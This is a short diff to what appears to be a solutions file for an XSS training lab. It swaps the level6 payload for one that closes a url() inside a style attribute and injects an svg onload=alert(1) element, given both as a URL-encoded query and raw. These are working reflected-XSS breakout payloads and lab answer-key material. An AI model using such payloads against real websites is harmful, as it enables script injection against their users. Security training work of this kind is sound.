@@ -39,7 +39,7 @@ Mixed reflection in tag content and various attributes; pick the simplest breako
 
 ### tagattrmix-level6
 
-`/tagattrmix/level6/?query=%27)%3C/style%3E%3Csvg%20onload=alert(1)%3E`
+`/tagattrmix/level6/?query=')%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `')</style><svg onload=alert(1)>`
-- context: inside style url('...'); close url, close style, inject
+- payload: `')"><svg onload=alert(1)>`
+- context: inside url('...') in a style attribute; close url() and the attribute
